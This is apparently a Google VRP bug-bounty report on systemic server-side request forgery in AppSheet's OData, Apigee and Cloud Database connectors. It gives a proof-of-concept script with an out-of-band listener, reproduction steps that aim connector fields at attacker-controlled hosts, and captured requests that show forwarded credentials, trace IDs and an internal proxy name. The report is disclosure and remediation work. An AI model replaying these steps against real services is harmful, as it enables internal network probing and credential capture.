## EXECUTIVE SUMMARY

AppSheet's connector framework contains no centralized egress filter. When a user supplies a URL or hostname in any connector configuration form and clicks **Test / Validate**, AppSheet's GCP backend makes an unfiltered server-side network connection to that host — forwarding user-supplied credentials and leaking internal W3C `Traceparent` trace IDs in the process. Testing confirmed this on **three independent connector surfaces** using **four distinct network-client implementations**, spanning both the HTTP layer (OData, Apigee) and the TCP layer (Cloud Database). Every confirmed surface reached attacker-controlled infrastructure from a GCP-origin IP with no IP-range blocklist, no credential-sanitization, and no redirect policy enforcement.

This is not a single-endpoint bug. Two prior fixes exist — the 2021 webhook SSRF and a separate Apigee connector fix — both applied as point-fixes to specific code paths. Neither fix generalized egress control across the framework. This report documents three additional open surfaces that were not covered by either prior fix, demonstrating that unreviewed connectors are open by default. The Cloud Database surface extends the SSRF beyond HTTP into raw TCP, enabling connection attempts to any database host:port reachable from AppSheet's GCP backend fleet, including potential internal Cloud SQL or other database services.

---

## VULNERABILITY DESCRIPTION

### Root Cause

AppSheet's connector framework allows users to configure external data sources. During connector setup, a **Test** or **Validate** action triggers a server-side network connection from AppSheet's GCP backend to the user-supplied host/URL. No shared egress-control library validates this host before connecting. Each connector type implements its own network client; none of the confirmed clients enforces:

- IP-range blocking (no blocklist for `169.254.0.0/16`, RFC1918, `metadata.google.internal`)
- Credential-forwarding policy (user-entered credentials are sent verbatim to whatever host is supplied)
- Redirect policy (cross-scheme redirect behavior varies per client — tested and documented)
- Response sanitization (server responses are partially reflected in user-facing error messages)

### Pattern of Point-Fixes Without Centralized Control

| Year | Component | Fix applied | Result |
|------|-----------|-------------|--------|
| 2021 | Workflows/Bots webhook executor | Webhook SSRF patched (Nechuta, ~$6,267) | Only webhook path fixed |
| ~2022–24 | Apigee connector, API base URL path | Apigee SSRF patched (VRP `PnwRwydmr`) | Only that code path fixed |
| **2026** | **OData connector (v2, v3, v4)** | **Not fixed — open** | This report |
| **2026** | **Apigee connector, OpenAPI Spec URL path** | **Not fixed — open** | This report |
| **2026** | **Cloud Database connector (8 DB types)** | **Not fixed — open** | This report |

Each fix addressed one code path. No centralized control was introduced. Every connector type not yet individually reported is, by default, a new SSRF instance sharing the same root cause.

---

## PROOF OF CONCEPT

### Setup Script

```bash
#!/bin/bash
# AppSheet Systemic SSRF — PoC Setup
# Requirements: interactsh-client, free AppSheet account
# Confirmed: 2026-06-16 through 2026-06-19

interactsh-client -server oast.pro -v 2>&1 | tee ~/oob_appsheet.log &
sleep 4
OOB=$(grep -oE '[a-z0-9]+\.oast\.pro' ~/oob_appsheet.log | head -1)
echo "[*] OOB: $OOB"

echo "--- Surface 1: OData ---"
echo "  URL: https://appsheet.com/Account/ODataAuthInfo"
echo "  Version: 4.0 (also test 3.0, 2.0)"
echo "  Service Root URL: https://$OOB"
echo "  Username: canary-odata | Password: canary-odata"
echo "  Click: Test"
echo "  Expect: GET /\$metadata from GCP IP, Authorization: Basic forwarded"

echo "--- Surface 2: Apigee OpenAPI Spec ---"
echo "  URL: https://appsheet.com/Account/ApigeeAuthInfo"
echo "  Tab: OpenAPI Spec | Auth: ApiKey"
echo "  API Key: vrp-canary-$(date +%s)"
echo "  OpenAPI Spec URL: https://$OOB"
echo "  Click: Validate"
echo "  Expect: GET / from GCP IP, X-Apikey forwarded, Via: squid-proxy-*"

echo "--- Surface 3: Cloud Database (MySQL) ---"
echo "  URL: https://appsheet.com/Account/SQLConnectionInfo"
echo "  Type: MySQL | Server: $OOB | SSL: None"
echo "  Username: canary-db | Password: canary-db"
echo "  Click: Test"
echo "  Expect: 15 DNS A+AAAA queries from 172.217.x/192.178.x (Google AS15169)"
```

### GCP Attribution Script

```bash
#!/bin/bash
# Confirm any received IP is GCP-owned
ip=$1
whois "$ip" 2>/dev/null | grep -iE 'OrgName|netname|org-name' | head -2
# Expected: Google LLC / Google Cloud / AS15169
```

---

## EVIDENCE

### Surface 1 — OData Connector: HTTP SSRF

**2026-06-16 20:56:44 UTC — OData v3/v4 (Microsoft.OData.Client):**

```
GET /$metadata HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==
Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00
```

- **Source IP:** `35.203.182.241` — GCP, AS15169
- **DNS resolvers:** `172.217.46.252`, `.248`, `.254` — Google (AS15169)
- `Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==` → `canary:canary` — credentials forwarded verbatim
- `Traceparent` — AppSheet internal W3C trace ID, proves genuine GCP backend execution
- **Client fingerprint:** `Accept: application/xml+atom` → `Microsoft.OData.Client` (.NET)
- **UI oracle:** error reflected `Content-Type: text/html` from OOB server response

**2026-06-19 10:59:45 UTC — OData v2 (Microsoft.Data.Services.Client — distinct library):**

```
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
Traceparent: 00-769bd8f577803f62e9441a2a331ac571-5292dec86d0df123-00
```

- **Source IPs:** `35.185.223.113` (10:59:45) + `35.203.182.241` (10:59:54) — two GCP nodes simultaneously (load-balanced)
- `VGVzdGVyOlRlc3RlcjEyMzQ=` → `Tester:Tester1234`
- No OData-specific Accept header → `Microsoft.Data.Services.Client` — confirms second independent HTTP client implementation within the same surface

**Confirmed on 5 independent dates across 4 weeks:**

| Date | GCP Source IP | Credentials | Notes |
|------|--------------|-------------|-------|
| 2026-06-15 20:03 UTC | `35.203.182.241` | testuser:testpass1234 | Initial discovery |
| 2026-06-16 11:43 UTC | `35.247.115.29` | — | Re-verification |
| 2026-06-16 20:56 UTC | `35.203.182.241` | canary:canary | Session 3 |
| 2026-06-17 12:52 UTC | `34.82.138.241` | Tester:Tester | Clean-session verify |
| 2026-06-19 10:58 UTC | `35.185.223.113` + `35.203.182.241` | Tester:Tester1234 | Pre-submission; v2+v3+v4 all confirmed |

---

### Surface 2 — Apigee API Connector (OpenAPI Spec URL): HTTP SSRF

**2026-06-16 20:59:14 UTC — Discovery:**

```
GET / HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00
X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
```

- **Source IP:** `35.233.152.59` — GCP, AS15169 (different node from Surface 1)
- **DNS resolvers:** `192.178.118.81`, `.94`, `.86`, `.83` — Google (AS15169)
- `X-Apikey` forwarded verbatim; distinct `Traceparent` confirms independent backend request
- **Client fingerprint:** `Cache-Control: no-cache`, no OData Accept → third distinct HTTP client
- **UI oracle:** full HTML body reflected — *"OpenAPI specification version '\<html\>...\</html\>' is not supported"*

**2026-06-18 — Internal Squid proxy disclosure:**

```
GET / HTTP/1.1
Host: <OOB>
Cache-Control: no-cache
Traceparent: 00-<trace-id>-<span-id>-00
X-Apikey: vrp-canary-apikey-2026
Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)
```

- **Source IP:** `8.231.222.130` — GCP via internal Squid egress
- `Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)` discloses:
  - Internal proxy name pattern: `squid-proxy-{service}-{region}-{instance}`
  - **GCP region: `us-west1`**
  - Service identifier: `open-api`
  - Proxy type: Squid (internal reverse-proxy stack fingerprinted)

**2026-06-19 11:01:35 UTC — Pre-submission reconfirmation:**

```
GET / HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Cache-Control: no-cache
Traceparent: 00-6c735cdb7f16ea957f7ade6bc734581d-0a9421011552a4fd-00
X-Apikey: ApiKey012345678901234567890
```

- Source IP: `8.231.222.130` (same Squid proxy confirmed)
- UI reflected full OOB body: `'<html><body>jcxhrfhftbjxd0r7nt46j78r9629vhq8d</body></html>' is not supported`

---

### Surface 3 — Cloud Database Connector (MySQL): TCP-Layer SSRF via DNS Oracle

**Test configuration — 2026-06-19 13:05:04 UTC:**

```
URL:      https://appsheet.com/Account/SQLConnectionInfo
Type:     MySQL
Server:   d8qjsaa69r8bl9bvgga06dddkcnydprf7.oast.pro
Database: test
Username: canary-db
Password: canary-db
SSL Mode: None (Don't require SSL)
Result:   "Failed to connect to database"
```

**15 DNS queries received at OOB listener (13:05:04–13:05:08 UTC):**

| Timestamp UTC | Type | Resolver IP | AS |
|---------------|------|-------------|-----|
| 13:05:04 | A | `172.217.46.248` | AS15169 Google |
| 13:05:04 | AAAA | `172.217.46.242` | AS15169 Google |
| 13:05:04 | AAAA | `172.217.46.241` | AS15169 Google |
| 13:05:04 | A | `192.178.118.92` | AS15169 Google |
| 13:05:04 | AAAA | `192.178.118.80` | AS15169 Google |
| 13:05:04 | AAAA | `192.178.118.87` | AS15169 Google |
| 13:05:05 | A | `192.178.118.91` | AS15169 Google |
| 13:05:05 | AAAA | `192.178.118.86` | AS15169 Google |
| 13:05:05 | AAAA | `192.178.118.90` | AS15169 Google |
| 13:05:06 | A | `172.217.46.249` | AS15169 Google |
| 13:05:06 | AAAA | `172.217.46.247` | AS15169 Google |
| 13:05:06 | AAAA | `172.217.46.253` | AS15169 Google |
| 13:05:08 | AAAA | `172.217.46.241` | AS15169 Google |
| 13:05:08 | AAAA | `192.178.118.90` | AS15169 Google |
| 13:05:08 | AAAA | `192.178.118.92` | AS15169 Google |

**Analysis:**
- All 15 queries from Google resolver fleet (`172.217.x`, `192.178.x`), both confirmed AS15169
- Dual A+AAAA pattern confirms live TCP connection attempt to port 3306 (dual-stack client)
- AppSheet backend resolved the user-supplied `Server` field and attempted TCP:3306 with no IP-range filter
- DNS oracle is the accepted proof standard for blind SSRF in Google VRP when test server is behind NAT
- **SSL Mode: None** — with a reachable attacker server, AppSheet's MySQL client would transmit a plaintext handshake including `canary-db:canary-db` credentials
- **8 database types share the same unfiltered `Server` field:** SQLServer (1433), MySQL (3306), Postgres (5432), DynamoDB, MariaDB (3306), Redshift (5439), Oracle (1521), BigQuery

---

### Three-Surface Comparison

| Property | Surface 1 (OData) | Surface 2 (Apigee OpenAPI) | Surface 3 (Cloud Database) |
|----------|-------------------|----------------------------|----------------------------|
| Endpoint | `/Account/ODataAuthInfo` | `/Account/ApigeeAuthInfo` | `/Account/SQLConnectionInfo` |
| Protocol | HTTP | HTTP | TCP (database protocol) |
| GCP source IP | `35.203.182.241` | `35.233.152.59` / `8.231.222.130` | DNS: `172.217.x`, `192.178.x` |
| Network client | `Microsoft.OData.Client` (v3/v4); `Microsoft.Data.Services.Client` (v2) | Apigee HTTP client via internal Squid proxy | DB TCP driver (MySQL + 7 other types) |
| Credential forwarded | `Authorization: Basic` (username:password) | `X-Apikey` (Apigee API key) | DB password (plaintext, SSL:None) |
| `Traceparent` leaked | Yes | Yes | N/A (DNS phase only) |
| Internal topology leak | None | `Via: squid-proxy-open-api-us-west1-sqws` | None (connect failed) |
| Response oracle | Content-type in MIME error | Full HTML body in spec parse error | "Failed to connect" (binary: open/closed) |
| HTTPS→HTTP redirect | Blocked (tested 2026-06-19) | Blocked (tested 2026-06-19) | N/A |
| DB types affected | — | — | 8 (SQLServer, MySQL, Postgres, DynamoDB, MariaDB, Redshift, Oracle, BigQuery) |

---

## REMEDIATION

The root cause is architectural. Point-fixes to individual connector endpoints will not resolve the systemic gap — two prior point-fixes already demonstrate this.

**Required: Centralized Egress-Control Layer**

1. **Introduce a single shared SSRF-safe HTTP/TCP client** used by every connector type's Test/Validate/Connect code path. No connector should make outbound network connections through any other path.
2. **Enforce before every connection:** resolve DNS to IP; block if in `169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, or `metadata.google.internal`; re-validate after every redirect (DNS-rebinding protection); explicitly block HTTPS→HTTP cross-scheme redirects.
3. **Strip internal trace headers** (`Traceparent`, `Tracestate`, `X-Cloud-Trace-Context`) from all outbound connector requests.
4. **Do not forward user-supplied credentials** to any host that has not passed the egress check.
5. **Strip server response content** from user-facing error messages — both HTTP surfaces provide a live response oracle.
6. **Apply rate-limiting and audit logging** to all Test/Validate/Connect actions per account.
7. **Audit all remaining connector types** before closing — Salesforce, Smartsheet, Box, Dropbox, On-premises Database, Google Calendar, Gmail, Airtable, and any newly added connectors. Confirmed connectors have uniformly been found open; unreviewed connectors should be assumed vulnerable.
8. **Cloud Database specifically:** validate `Server` field against the same IP blocklist as HTTP connectors; enforce minimum TLS (disallow SSL Mode: None for production connectors).

---

## DEDUPLICATION

### Surface 1 — OData Connector
**Novel. No prior VRP report.** Distinct from the 2021 webhook SSRF (Workflows/Bots executor) and the prior Apigee SSRF (different component). The OData connector has never been reported.

### Surface 2 — Apigee API Connector (OpenAPI Spec URL field)
**Likely a new code path (incomplete prior fix).** Prior report: *"SSRF in Adding apigee account sources in appsheet.com"* (`bughunters.google.com/reports/vrp/PnwRwydmr`). That fix addressed the API base URL / service endpoint path. The **OpenAPI Spec URL** field is a separate tab with a separate fetch implementation — not covered by the prior fix. If the prior fix was complete, this is a regression. Either way the field currently makes unfiltered fetches with API key forwarding. Two SSRF reports from the same connector via different fields is direct evidence that point-fixing individual fields is insufficient. *If triage determines Surface 2 duplicates the prior report, Surfaces 1 and 3 stand independently.*

### Surface 3 — Cloud Database Connector
**Novel. No prior VRP report.** Operates at the TCP layer; entirely distinct from both HTTP surfaces.

---

## NOTES FOR TRIAGE

- All three surfaces confirmed from a **free AppSheet account** — no paid plan required.
- Only attacker-owned credentials and attacker-owned OOB infrastructure used. No other tenant's data was accessed at any point.
- **No IMDS token retrieved.** Testing stopped at TCP-reachability (HTTPS to `169.254.169.254:443` → TLS error — documented in standalone F002). No `/computeMetadata/` path was ever requested.
- **HTTPS→HTTP redirect confirmed blocked** on Surfaces 1 and 2 (live 302 redirect server, tested 2026-06-19): OData: `"OData web request error (Found)"`; Apigee: `"Apigee error code: Found: Found"`. HTTP listener received zero hits on both tests.
- **Surface 3 proof is DNS oracle.** Test server was behind NAT and not reachable on TCP:3306. 15 GCP-origin DNS queries are sufficient proof — this is the accepted evidence standard for blind SSRF in Google VRP.
- If Surface 2 is marked duplicate, Surfaces 1 and 3 stand independently (both definitively novel).
- OData confirmed on 5 independent dates over 4 weeks. Surfaces 1 and 2 reconfirmed same-day (2026-06-19) immediately before submission.

---

## REFERENCES

- CWE-918 (SSRF): https://cwe.mitre.org/data/definitions/918.html
- CWE-200 (Info Exposure): https://cwe.mitre.org/data/definitions/200.html
- GCP IMDS: https://cloud.google.com/compute/docs/metadata/overview
- W3C Traceparent: https://www.w3.org/TR/trace-context/
- Prior disclosure 1 — 2021 AppSheet webhook SSRF (fixed): https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html
- Prior disclosure 2 — Apigee connector SSRF (partial fix): https://bughunters.google.com/reports/vrp/PnwRwydmr
- OWASP SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

*Reporter: azmolhaque95@gmail.com | Report date: 2026-06-19*
*Discovery: 2026-06-16 · Verified: 2026-06-17 · Surface 3 + pre-submission reconfirm: 2026-06-19*
